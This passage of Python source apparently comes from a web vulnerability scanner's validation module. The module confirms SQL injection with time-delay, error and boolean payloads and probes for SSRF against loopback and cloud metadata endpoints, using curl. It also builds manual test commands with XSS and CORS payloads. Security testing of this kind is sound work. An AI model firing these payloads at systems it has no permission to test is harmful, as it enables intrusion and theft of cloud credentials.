        last_comment_open = prefix.rfind('<!--')
        last_comment_close = prefix.rfind('-->')
        if last_comment_open > last_comment_close:
            return 'html_comment'

        return 'html_body'

    def validate_sqli(self, finding: dict) -> dict:
        """
        Validate SQL injection vulnerability with three detection methods:
        1. Error-based: check for real DBMS error strings
        2. Time-based: baseline timing vs SLEEP injection (3 samples each)
        3. Boolean-based: true-condition vs false-condition response length diff
        """
        url = finding.get('url', '')
        param = finding.get('param', 'id')
        method = finding.get('method', 'GET').upper()
        data = finding.get('data', '')  # For POST-based injection

        sep = '&' if '?' in url else '?'

        try:
            # === Error-based detection ===
            error_value = "1'"
            normal_value = "1"

            error_output = self._sqli_request(url, param, error_value, method, data)
            normal_output = self._sqli_request(url, param, normal_value, method, data)

            self._save_curl_output(f'sqli_error_{self._request_count}.txt', error_output)
            self._save_curl_output(f'sqli_normal_{self._request_count}.txt', normal_output)
            self._request_count += 1

            # Check for REAL DBMS error strings (not generic words)
            detected_dbms, matched_error = self._contains_sql_error(error_output)

            if detected_dbms and error_output != normal_output:
                logger.info(f"SQLi CONFIRMED (error-based): {detected_dbms} error at {url}")
                return {
                    'pass': True,
                    'reason': f'SQL injection confirmed (error-based): {detected_dbms} error string in response',
                    'evidence': f'DBMS: {detected_dbms}, Error: {matched_error}. Response excerpt: {error_output[:300]}',
                    'detection_method': 'error-based',
                    'dbms': detected_dbms
                }

            # === Time-based detection ===
            # Measure 3 baseline requests
            baseline_times = []
            for i in range(3):
                elapsed = self._time_request(url, param, normal_value, method, data)
                baseline_times.append(elapsed)

            avg_baseline = sum(baseline_times) / len(baseline_times)
            max_baseline = max(baseline_times)
            logger.info(f"SQLi time baseline: avg={avg_baseline:.2f}s, max={max_baseline:.2f}s")

            # Try multiple SLEEP payloads for different DBMS
            sleep_payloads = [
                ("1' AND SLEEP(5)-- -", "MySQL"),
                ("1'; WAITFOR DELAY '0:0:5'-- -", "MSSQL"),
                ("1' AND pg_sleep(5)-- -", "PostgreSQL"),
                ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "Oracle"),
            ]

            for sleep_payload, dbms_name in sleep_payloads:
                sleep_times = []
                for i in range(3):
                    elapsed = self._time_request(url, param, sleep_payload, method, data)
                    sleep_times.append(elapsed)

                avg_sleep = sum(sleep_times) / len(sleep_times)
                delta = avg_sleep - avg_baseline

                # Confirm: delta must be > 4s AND each sleep request must exceed max_baseline + 3s
                all_slow = all(t > max_baseline + 3.0 for t in sleep_times)

                if delta > 4.0 and all_slow:
                    logger.info(f"SQLi CONFIRMED (time-based): {dbms_name} SLEEP at {url}, delta={delta:.1f}s")
                    return {
                        'pass': True,
                        'reason': f'SQL injection confirmed (time-based): {dbms_name} delay of {delta:.1f}s',
                        'evidence': f'Baseline avg: {avg_baseline:.2f}s (max {max_baseline:.2f}s), '
                                    f'SLEEP avg: {avg_sleep:.2f}s, Delta: {delta:.1f}s. '
                                    f'All 3 sleep requests exceeded baseline+3s threshold.',
                        'detection_method': 'time-based',
                        'dbms': dbms_name
                    }

            # === Boolean-based detection ===
            true_value = "1' OR '1'='1"
            false_value = "1' AND '1'='2"

            true_output = self._sqli_request(url, param, true_value, method, data)
            false_output = self._sqli_request(url, param, false_value, method, data)

            self._save_curl_output(f'sqli_bool_true_{self._request_count}.txt', true_output)
            self._save_curl_output(f'sqli_bool_false_{self._request_count}.txt', false_output)
            self._request_count += 1

            true_len = len(true_output)
            false_len = len(false_output)
            normal_len = len(normal_output)
            len_diff = abs(true_len - false_len)

            # Boolean: true-condition should match normal, false-condition should differ significantly
            # AND both must differ from the error response (otherwise it's just generic error handling)
            if len_diff > 100 and true_output != false_output:
                # Extra check: true response should be closer to normal than false response
                true_vs_normal = abs(true_len - normal_len)
                false_vs_normal = abs(false_len - normal_len)

                if true_vs_normal < false_vs_normal and true_output != error_output:
                    logger.info(f"SQLi CONFIRMED (boolean-based) at {url}, len_diff={len_diff}")
                    return {
                        'pass': True,
                        'reason': f'SQL injection confirmed (boolean-based): true/false conditions produce different responses',
                        'evidence': f'True condition: {true_len}B, False condition: {false_len}B, '
                                    f'Normal: {normal_len}B, Diff: {len_diff}B. '
                                    f'True response is closer to normal ({true_vs_normal}B diff) than false ({false_vs_normal}B diff).',
                        'detection_method': 'boolean-based'
                    }

            return {
                'pass': False,
                'reason': 'No SQL injection detected across error-based, time-based, and boolean-based tests',
                'evidence': f'Error-based: no DBMS errors. Time-based: no significant delay. '
                            f'Boolean-based: len_diff={len_diff}B (threshold: 100B).'
            }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'SQL injection validation error: {str(e)}',
                'evidence': str(e)
            }

    def _contains_sql_error(self, text: str) -> Tuple[Optional[str], Optional[str]]:
        """
        Check for real DBMS error strings. Returns (dbms_name, matched_error) or (None, None).
        Only matches specific error patterns that prove SQL execution context.
        """
        text_lower = text.lower()

        dbms_errors = {
            'MySQL': [
                "you have an error in your sql syntax",
                "error in your sql syntax",
                "check the manual that corresponds to your mysql server version",
                "mysql_fetch_array()",
                "mysql_fetch_assoc()",
                "mysql_num_rows()",
                "mysql_query()",
                "supplied argument is not a valid mysql",
                "warning: mysql_",
            ],
            'PostgreSQL': [
                "pg_query(): query failed",
                "pg_exec(): query failed",
                'error: unterminated quoted string',
                'error: syntax error at or near',
                "invalid input syntax for",
                "psycopg2.errors.",
                "pq: syntax error",
            ],
            'MSSQL': [
                "unclosed quotation mark after the character string",
                "incorrect syntax near",
                "an expression of non-boolean type specified",
                "mssql_query()",
                "odbc sql server driver",
                "sqlsrv_query()",
                "[microsoft][odbc sql server driver]",
            ],
            'Oracle': [
                "ora-00933",
                "ora-01756",
                "ora-01747",
                "ora-00936",
                "ora-06512",
                "quoted string not properly terminated",
                "oracleexception",
            ],
            'SQLite': [
                'near "syntax": syntax error',
                "near \"%s\": syntax error",
                "unrecognized token",
                "sqlite3.operationalerror",
                "sqlite_error",
                "sqlite3::query",
            ],
            'PDO': [
                "sqlstate[",
                "pdoexception",
                "pdo::query()",
                "fatal error: uncaught pdoexception",
            ],
        }

        for dbms, patterns in dbms_errors.items():
            for pattern in patterns:
                if pattern in text_lower:
                    return (dbms, pattern)

        return (None, None)

    def _time_request(self, url: str, param: str, value: str, method: str = 'GET', data: str = '') -> float:
        """Make a timed HTTP request and return elapsed seconds."""
        if method == 'POST':
            # Inject into POST data
            if data:
                inject_data = data.replace(f'{param}=', f'{param}={value}', 1)
            else:
                inject_data = f'{param}={value}'
            cmd = ['curl', '-s', '-X', 'POST', '-d', inject_data, '-m', '15', '-o', '/dev/null', url]
        else:
            sep = '&' if '?' in url else '?'
            test_url = f"{url}{sep}{param}={value}"
            cmd = ['curl', '-s', '-m', '15', '-o', '/dev/null', test_url]

        start = time.time()
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        except subprocess.TimeoutExpired:
            pass
        return time.time() - start

    def _sqli_request(self, url: str, param: str, value: str, method: str = 'GET', data: str = '') -> str:
        """Make an HTTP request with an injected parameter value and return the response body."""
        if method == 'POST':
            if data:
                inject_data = data.replace(f'{param}=', f'{param}={value}', 1)
            else:
                inject_data = f'{param}={value}'
            cmd = ['curl', '-s', '-X', 'POST', '-d', inject_data, '-m', '10', url]
        else:
            sep = '&' if '?' in url else '?'
            test_url = f"{url}{sep}{param}={value}"
            cmd = ['curl', '-s', '-m', '10', test_url]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            return result.stdout.lower()
        except (subprocess.TimeoutExpired, Exception):
            return ''

    def validate_ssrf(self, finding: dict) -> dict:
        """
        Validate SSRF vulnerability with proper IP validation and cloud metadata detection.

        Tests:
        1. Inject internal IPs (127.0.0.1, 169.254.169.254) and check for private IP content
        2. Use ipaddress module to detect any private/loopback/link-local IPs in response
        3. Check for cloud metadata content patterns (AWS, GCP, Azure)
        4. Compare internal vs external request responses
        """
        url = finding.get('url', '')
        param = finding.get('param', 'url')
        method = finding.get('method', 'GET').upper()
        data = finding.get('data', '')

        sep = '&' if '?' in url else '?'

        # Targets to probe (internal resources)
        ssrf_targets = [
            ('http://127.0.0.1', 'loopback'),
            ('http://169.254.169.254/latest/meta-data/', 'aws_metadata'),
            ('http://metadata.google.internal/computeMetadata/v1/', 'gcp_metadata'),
            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'azure_metadata'),
            ('http://[::1]/', 'ipv6_loopback'),
            ('http://0x7f000001/', 'hex_loopback'),
        ]

        # Baseline: fetch an external domain for comparison
        baseline_value = 'http://example.com'

        try:
            baseline_output = self._ssrf_request(url, param, baseline_value, method, data)
            self._save_curl_output(f'ssrf_baseline_{self._request_count}.txt', baseline_output)
            self._request_count += 1

            for target_url, target_type in ssrf_targets:
                target_output = self._ssrf_request(url, param, target_url, method, data)
                self._save_curl_output(f'ssrf_{target_type}_{self._request_count}.txt', target_output)
                self._request_count += 1

                if not target_output or target_output == baseline_output:
                    continue

                # Check 1: Does the response contain private/internal IP addresses?
                found_internal_ips = self._contains_internal_ip(target_output)

                # Check 2: Does the response contain cloud metadata content?
                metadata_match = self._contains_cloud_metadata(target_output)

                # Check 3: Does the response look like it came from an internal service?
                internal_service_indicators = [
                    'ami-id', 'instance-id', 'instance-type', 'local-hostname',
                    'local-ipv4', 'public-hostname', 'security-credentials',
                    'iam/info', 'network/interfaces',
                    'computeMetadata', 'project/project-id',
                    'microsoft-iis', 'apache', 'nginx',
                ]
                has_internal_indicator = any(ind in target_output.lower() for ind in internal_service_indicators)

                if metadata_match:
                    logger.info(f"SSRF CONFIRMED: cloud metadata ({metadata_match}) from {target_type}")
                    return {
                        'pass': True,
                        'reason': f'SSRF confirmed: cloud metadata exposed ({metadata_match})',
                        'evidence': target_output[:500],
                        'ssrf_target': target_url,
                        'detection': 'cloud_metadata',
                        'severity': 'critical'
                    }

                if found_internal_ips:
                    logger.info(f"SSRF CONFIRMED: internal IPs in response from {target_type}: {found_internal_ips}")
                    return {
                        'pass': True,
                        'reason': f'SSRF confirmed: response contains private IP addresses: {found_internal_ips}',
                        'evidence': target_output[:500],
                        'ssrf_target': target_url,
                        'detection': 'internal_ip_in_response',
                        'internal_ips': found_internal_ips
                    }

                if has_internal_indicator:
                    logger.info(f"SSRF likely: internal service indicator from {target_type}")
                    return {
                        'pass': True,
                        'reason': f'SSRF likely confirmed: response contains internal service data',
                        'evidence': target_output[:500],
                        'ssrf_target': target_url,
                        'detection': 'internal_service_data',
                        'note': 'Verify with OOB callback (interactsh) for definitive proof'
                    }

                # Response differs but no clear internal content - weaker signal
                if len(target_output) > 50 and target_output != baseline_output:
                    len_diff = abs(len(target_output) - len(baseline_output))
                    if len_diff > 200:
                        logger.info(f"SSRF possible: different response for {target_type} (delta: {len_diff}B)")
                        return {
                            'pass': True,
                            'reason': f'Possible SSRF: significantly different response for internal target ({target_type})',
                            'evidence': f'Internal: {len(target_output)}B vs Baseline: {len(baseline_output)}B (delta: {len_diff}B). '
                                        f'Response excerpt: {target_output[:300]}',
                            'ssrf_target': target_url,
                            'detection': 'response_difference',
                            'note': 'Use OOB callback (interactsh) for definitive confirmation'
                        }

            return {
                'pass': False,
                'reason': 'No SSRF detected: all internal targets returned identical or empty responses vs baseline',
                'evidence': f'Tested {len(ssrf_targets)} internal targets. Baseline: {len(baseline_output)}B.'
            }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'SSRF validation error: {str(e)}',
                'evidence': str(e)
            }

    def _ssrf_request(self, url: str, param: str, value: str, method: str = 'GET', data: str = '') -> str:
        """Make an HTTP request with an SSRF payload and return the response body."""
        if method == 'POST':
            if data:
                inject_data = data.replace(f'{param}=', f'{param}={value}', 1)
            else:
                inject_data = f'{param}={value}'
            cmd = ['curl', '-s', '-X', 'POST', '-d', inject_data, '-m', '10', url]
        else:
            sep = '&' if '?' in url else '?'
            test_url = f"{url}{sep}{param}={value}"
            cmd = ['curl', '-s', '-m', '10', test_url]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            return result.stdout
        except (subprocess.TimeoutExpired, Exception):
            return ''

    def _contains_internal_ip(self, text: str) -> List[str]:
        """
        Extract and validate private/loopback/link-local IP addresses from text
        using the ipaddress module. Returns list of found internal IPs.
        """
        found = []
        # Match IPv4 addresses
        ip_pattern = re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', text)

        for ip_str in ip_pattern:
            try:
                ip = ipaddress.ip_address(ip_str)
                if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
                    # Exclude common false positives (0.0.0.0, broadcast)
                    if ip_str not in ('0.0.0.0', '255.255.255.255'):
                        found.append(ip_str)
            except ValueError:
                continue

        # Also check for IPv6 internal addresses
        ipv6_pattern = re.findall(r'\b((?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4})\b', text)
        for ip_str in ipv6_pattern:
            try:
                ip = ipaddress.ip_address(ip_str)
                if ip.is_private or ip.is_loopback or ip.is_link_local:
                    found.append(ip_str)
            except ValueError:
                continue

        # Deduplicate while preserving order
        seen = set()
        unique = []
        for ip in found:
            if ip not in seen:
                seen.add(ip)
                unique.append(ip)
        return unique

    def _contains_cloud_metadata(self, text: str) -> Optional[str]:
        """
        Check for cloud metadata content patterns. Returns provider name or None.
        Checks for actual metadata content, not just keywords.
        """
        text_lower = text.lower()

        # AWS EC2 metadata patterns (actual content structure)
        aws_patterns = [
            ('ami-id', 'ami-'),
            ('instance-id', 'i-'),
            ('instance-type', '/'),
            ('iam/security-credentials', '{'),
            ('meta-data/hostname', '.ec2.internal'),
            ('meta-data/local-ipv4', '.'),
            ('identity-credentials/ec2', 'Code'),
        ]
        for pattern, content_hint in aws_patterns:
            if pattern in text_lower:
                return 'AWS'

        # GCP metadata patterns
        gcp_patterns = [
            'computeMetadata',
            'project/project-id',
            'instance/zone',
            'instance/service-accounts',
            'instance/machine-type',
        ]
        for pattern in gcp_patterns:
            if pattern.lower() in text_lower:
                return 'GCP'

        # Azure metadata patterns (IMDS response structure)
        azure_patterns = [
            '"compute"',
            '"azEnvironment"',
            'subscriptionId',
            '"resourceGroupName"',
            '"vmId"',
            '"vmSize"',
        ]
        for pattern in azure_patterns:
            if pattern.lower() in text_lower:
                return 'Azure'

        # DigitalOcean metadata
        if 'droplet_id' in text_lower or '/metadata/v1' in text_lower:
            return 'DigitalOcean'

        return None

    def validate_security_headers(self, finding: dict) -> dict:
        """Validate missing or weak security headers"""
        url = finding.get('url', '')
        header_name = finding.get('header_name', '').lower()
        expected_issue = finding.get('expected_issue', '')  # 'missing' or 'weak'

        try:
            result = subprocess.run(
                ['curl', '-s', '-I', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            headers = result.stdout.lower()
            self._save_curl_output(f'headers_check_{self._request_count}.txt', result.stdout)
            self._request_count += 1

            header_present = header_name in headers

            if expected_issue == 'missing':
                if not header_present:
                    return {
                        'pass': True,
                        'reason': f'{header_name} header is missing',
                        'evidence': headers
                    }
                else:
                    return {
                        'pass': False,
                        'reason': f'{header_name} header is present',
                        'evidence': headers
                    }

            elif expected_issue == 'weak':
                if header_present:
                    # Check for specific weak patterns
                    if 'unsafe-inline' in headers or 'unsafe-eval' in headers:
                        return {
                            'pass': True,
                            'reason': f'{header_name} contains unsafe directives',
                            'evidence': headers
                        }
                    else:
                        return {
                            'pass': False,
                            'reason': f'{header_name} appears properly configured',
                            'evidence': headers
                        }
                else:
                    return {
                        'pass': False,
                        'reason': f'{header_name} header is missing (claimed weak)',
                        'evidence': 'Header not found'
                    }

            return {
                'pass': False,
                'reason': f'Invalid expected_issue value: {expected_issue}',
                'evidence': 'Use "missing" or "weak"'
            }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'Security headers validation error: {str(e)}',
                'evidence': str(e)
            }

    def validate_server_disclosure(self, finding: dict) -> dict:
        """Validate server/technology disclosure in headers"""
        url = finding.get('url', '')
        expected_header = finding.get('expected_header', '')  # e.g., "X-Powered-By"
        expected_value = finding.get('expected_value', '')    # e.g., "Koa"

        try:
            result = subprocess.run(
                ['curl', '-s', '-I', '-m', '10', url],
                capture_output=True,
                text=True,
                timeout=15
            )

            headers = result.stdout
            self._save_curl_output(f'server_disclosure_{self._request_count}.txt', headers)
            self._request_count += 1

            # Check for specific header and value
            if expected_header and expected_value:
                pattern = f'{expected_header}:.*{expected_value}'
                if re.search(pattern, headers, re.IGNORECASE):
                    return {
                        'pass': True,
                        'reason': f'Server disclosure confirmed: {expected_header}: {expected_value}',
                        'evidence': headers
                    }
                else:
                    return {
                        'pass': False,
                        'reason': f'{expected_header}: {expected_value} not found in headers',
                        'evidence': headers
                    }

            # General check for disclosure headers
            disclosure_headers = ['server:', 'x-powered-by:', 'x-aspnet-version:']
            found = [h for h in disclosure_headers if h in headers.lower()]

            if found:
                return {
                    'pass': True,
                    'reason': f'Server disclosure found: {found}',
                    'evidence': headers
                }
            else:
                return {
                    'pass': False,
                    'reason': 'No server disclosure headers found',
                    'evidence': headers
                }

        except Exception as e:
            return {
                'pass': False,
                'reason': f'Server disclosure validation error: {str(e)}',
                'evidence': str(e)
            }

    def generate_curl_command(self, finding: dict) -> str:
        """Generate curl command for manual verification"""
        url = finding.get('url', '')
        vuln_type = finding.get('vulnerability_type', '').lower()

        if vuln_type == 'cors':
            return f"curl -I -H 'Origin: https://evil.com' '{url}'"
        elif vuln_type == 'graphql_introspection':
            return f"""curl -X POST -H 'Content-Type: application/json' -d '{{"query":"{{ __schema {{ types {{ name }} }} }}"}}' '{url}'"""
        elif vuln_type == 'xss':
            param = finding.get('param', 'q')
            return f"curl '{url}?{param}=<script>alert(1)</script>'"
        elif vuln_type == 'sqli':
            param = finding.get('param', 'id')
            return f"curl '{url}?{param}=1\\''"
        else:
            return f"curl -I '{url}'"

    def _is_waf_block(self, response: str) -> bool:
        """Detect if response is a WAF block page"""
        response_lower = response.lower()

        # WAF-specific signatures (not just generic "forbidden")
        waf_signatures = [
            'attention required',
            'access denied',
            'request blocked',
            'security check',
            'blocked',
            'captcha'
        ]

        # WAF vendor signatures
        waf_vendors = [
            'cloudflare',
            'akamai',
            'incapsula',
            'imperva'
        ]

        # Check if it's a 403 with WAF signatures
        if 'http/1.1 403' in response_lower or 'http/2 403' in response_lower:
            # Must have either a WAF-specific signature OR a WAF vendor name
            has_waf_sig = any(sig in response_lower for sig in waf_signatures)
            has_vendor = any(vendor in response_lower for vendor in waf_vendors)
            return has_waf_sig or has_vendor

        return False

    def _save_curl_output(self, filename: str, content: str):
        """Save curl output to file"""
        filepath = self.output_dir / filename
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Failed to save {filename}: {e}{Style.RESET_ALL}")

    def _build_verdict(self, finding_id: str, verdict: str, vuln_type: str,
                       url: str, steps: dict, reason: str) -> dict:
        """Build standardized verdict dictionary"""
        return {
            'finding_id': finding_id,
            'verdict': verdict,
            'vulnerability_type': vuln_type,
            'url': url,
            'validation_steps': steps,
            'reason': reason,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }

    def get_summary(self) -> dict:
        """Get validation summary statistics"""
        total = len(self.validated_findings)
        confirmed = sum(1 for f in self.validated_findings if f['verdict'] == self.CONFIRMED)
        false_positives = sum(1 for f in self.validated_findings if f['verdict'] == self.FALSE_POSITIVE)
        needs_auth = sum(1 for f in self.validated_findings if f['verdict'] == self.NEEDS_AUTH)

        return {
            'total_validated': total,
            'confirmed': confirmed,
            'false_positives': false_positives,
            'needs_auth': needs_auth,
            'success_rate': (confirmed / total * 100) if total > 0 else 0
        }
